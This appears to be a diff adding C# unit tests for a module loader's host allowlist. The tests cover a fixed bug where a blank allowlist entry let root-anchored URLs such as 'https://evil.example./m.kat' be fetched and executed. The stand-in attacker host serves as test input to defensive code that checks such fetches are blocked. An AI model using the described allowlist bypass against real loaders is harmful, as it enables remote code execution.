@@ -309,6 +309,203 @@ public class ModuleLoaderTests
                  d.Message.Contains("domain not allowed"));
     }
 
+    // ── AllowedHosts blank-entry policy (bug-hunt B5a) ──────────────────────
+    //
+    // The loader admits a host that equals an entry or ends with "." + entry. An
+    // EMPTY entry made that suffix "." and admitted every root-anchored FQDN: with
+    // `AllowedHosts = ["ex.com", ""]` (a trailing comma when splitting) or `[""]`,
+    // `open 'https://evil.example./m.kat'` was fetched and EXECUTED. Two layers now
+    // fail closed: the options boundary (both front ends) rejects null/blank
+    // entries with ArgumentException and trims the rest, and the loader's own
+    // arm refuses a blank entry so a directly constructed loader stays closed.
+
+    /// <summary>The root-anchored spelling whose host ends with a dot, so a "." suffix used to admit it.</summary>
+    private const string RootAnchoredModuleSource = "open 'https://evil.example./m.kat'\nX";
+
+    public static IEnumerable<object[]> BlankAllowedHostConfigurations()
+    {
+        yield return [new[] { "ex.com", "" }];
+        yield return [new[] { "ex.com", null! }];
+        yield return [new[] { "" }];
+        yield return [new[] { " " }];
+    }
+
+    [Theory]
+    [MemberData(nameof(BlankAllowedHostConfigurations))]
+    public async Task Load_BlankAllowedHostEntry_IsRejectedAtTheOptionsBoundary(string[] allowedHosts)
+    {
+        var fetches = 0;
+        var options = new RunOptions
+        {
+            DownloadCode = (_, _) =>
+            {
+                fetches++;
+                return ValueTask.FromResult("public X = 1337");
+            },
+            AllowedHosts = allowedHosts,
+        };
+
+        // Before any parsing or loading: the configuration itself is the error.
+        var parseFailure = await Assert.ThrowsAsync<ArgumentException>(
+            () => Parser.ParseAsync(RootAnchoredModuleSource, options));
+        Assert.Equal(nameof(RunOptions.AllowedHosts), parseFailure.ParamName);
+        await Assert.ThrowsAsync<ArgumentException>(() => KatLangEngine.RunAsync(RootAnchoredModuleSource, options));
+        Assert.Throws<ArgumentException>(() => Parser.Parse("1", options));
+        Assert.Throws<ArgumentException>(() => KatLangEngine.Run("1", options));
+        Assert.Equal(0, fetches);
+
+        // The synchronous front end validates the same configuration, downloader or not.
+        var synchronousOptions = new RunOptions { AllowedHosts = allowedHosts };
+        Assert.Throws<ArgumentException>(() => Parser.Parse("1", synchronousOptions));
+        Assert.Throws<ArgumentException>(() => KatLangEngine.Run("1", synchronousOptions));
+        await Assert.ThrowsAsync<ArgumentException>(() => Parser.ParseAsync("1", synchronousOptions));
+        await Assert.ThrowsAsync<ArgumentException>(() => KatLangEngine.RunAsync("1", synchronousOptions));
+    }
+
+    /// <summary>
+    /// Defense in depth below the options boundary: a directly constructed
+    /// loader (an internal stage no host can reach) with a blank entry rejects
+    /// the root-anchored host on its own arm instead of admitting it.
+    /// </summary>
+    [Theory]
+    [InlineData("")]
+    [InlineData(" ")]
+    [InlineData(null)]
+    public async Task Load_BlankAllowedHostEntry_InternalLoaderStaysClosed(string? blankEntry)
+    {
+        var fetches = 0;
+        var diagnostics = new List<Diagnostic>();
+        var loader = new ModuleLoader(
+            diagnostics,
+            (_, _) =>
+            {
+                fetches++;
+                return ValueTask.FromResult("public X = 1337");
+            },
+            allowedHosts: ["ex.com", blankEntry!]);
+
+        await loader.ElaborateAsync(SourceProvenance.ParseSyntaxValidRoot(RootAnchoredModuleSource));
+
+        var rejection = Assert.Single(diagnostics, d => d.Severity == DiagnosticSeverity.Error);
+        Assert.Equal(DiagnosticCode.InvalidLoadUrl, rejection.Code);
+        Assert.Contains("domain not allowed: 'evil.example.'", rejection.Message);
+        Assert.Equal(0, fetches);
+    }
+
+    [Fact]
+    public async Task Load_AllowedHostEntries_AreTrimmed()
+    {
+        var options = new RunOptions
+        {
+            DownloadCode = MockDownloader(new Dictionary<string, string>
+            {
+                ["https://ex.com/m.kat"] = "public X = 1337",
+            }),
+            AllowedHosts = ["  ex.com  "],
+        };
+
+        var provenance = await SourceProvenance.ParseValidAsync("open 'https://ex.com/m.kat'\nX", options);
+
+        var result = provenance.Evaluate();
+        Assert.True(result.IsOk, result.IsError ? result.Error.ToString() : null);
+        Assert.True(Result.ValueComparer.Equals(new Result.Atom(1337), result.Value));
+    }
+
+    /// <summary>
+    /// The exact-or-subdomain rule is untouched by the blank-entry guard: a
+    /// subdomain of an entry is admitted, a host that merely CONTAINS the entry is
+    /// not, and the root-anchored (trailing-dot) spelling stays rejected exactly as
+    /// before.
+    /// </summary>
+    [Theory]
+    [InlineData("https://ex.com/m.kat", true)]
+    [InlineData("https://sub.ex.com/m.kat", true)]
+    [InlineData("https://ex.com.evil.net/m.kat", false)]
+    [InlineData("https://notex.com/m.kat", false)]
+    [InlineData("https://evil.example./m.kat", false)]
+    [InlineData("https://ex.com./m.kat", false)]
+    [InlineData("https://sub.ex.com./m.kat", false)]
+    [InlineData("https://SUB.EX.COM/m.kat", true)]
+    public async Task Load_ExactOrSubdomainRule_IsUnchangedByTheBlankEntryGuard(string url, bool admitted)
+    {
+        var fetched = new List<string>();
+        var options = new RunOptions
+        {
+            DownloadCode = (requestedUrl, _) =>
+            {
+                fetched.Add(requestedUrl);
+                return ValueTask.FromResult("public X = 1337");
+            },
+            AllowedHosts = ["ex.com"],
+        };
+        var source = $"open '{url}'\nX";
+
+        if (admitted)
+        {
+            var provenance = await SourceProvenance.ParseValidAsync(source, options);
+            var result = provenance.Evaluate();
+            Assert.True(result.IsOk, result.IsError ? result.Error.ToString() : null);
+            Assert.True(Result.ValueComparer.Equals(new Result.Atom(1337), result.Value));
+            Assert.Equal([new Uri(url).AbsoluteUri], fetched);
+            return;
+        }
+
+        var parsed = await Parser.ParseAsync(source, options);
+        Assert.True(parsed.HasErrors);
+        var rejection = Assert.Single(parsed.Diagnostics, d => d.Severity == DiagnosticSeverity.Error);
+        Assert.Equal(DiagnosticCode.InvalidLoadUrl, rejection.Code);
+        Assert.Contains("domain not allowed", rejection.Message);
+        Assert.Empty(fetched);
+    }
+
+    [Fact]
+    public async Task Load_AllowedHosts_IsSnapshottedBeforeTheDownloaderCanMutateIt()
+    {
+        var allowedHosts = new List<string> { "ex.com" };
+        var fetched = new List<string>();
+        var parsed = await Parser.ParseAsync("open 'https://ex.com/m.kat'\nX", new RunOptions
+        {
+            AllowedHosts = allowedHosts,
+            DownloadCode = (url, _) =>
+            {
+                fetched.Add(url);
+                allowedHosts.Add("evil.example");
+                allowedHosts.Add("");
+                return ValueTask.FromResult("open 'https://evil.example/n.kat'\npublic X = 1");
+            },
+        });
+
+        Assert.Equal(["https://ex.com/m.kat"], fetched);
+        Assert.Contains(parsed.Diagnostics, d => d.Code == DiagnosticCode.InvalidLoadUrl
+            && d.Message.Contains("evil.example"));
+    }
+
+    [Theory]
+    [InlineData("ex.com.", "https://sub.ex.com./m.kat", true)]
+    [InlineData("ex.com.", "https://sub.ex.com/m.kat", false)]
+    [InlineData(".", "https://evil.example./m.kat", false)]
+    [InlineData("..", "https://evil.example./m.kat", false)]
+    public async Task Load_RootAnchoredAllowEntries_KeepTheirExistingLiteralMatching(
+        string allowedHost, string url, bool admitted)
+    {
+        var fetches = 0;
+        var parsed = await Parser.ParseAsync($"open '{url}'\nX", new RunOptions
+        {
+            AllowedHosts = [allowedHost],
+            DownloadCode = (_, _) =>
+            {
+                fetches++;
+                return ValueTask.FromResult("public X = 1");
+            },
+        });
+
+        Assert.Equal(admitted ? 1 : 0, fetches);
+        if (admitted)
+            Assert.Empty(parsed.Diagnostics);
+        else
+            Assert.Contains(parsed.Diagnostics, d => d.Code == DiagnosticCode.InvalidLoadUrl);
+    }
+
     // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     //  D) Dynamic URL blocked
     // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
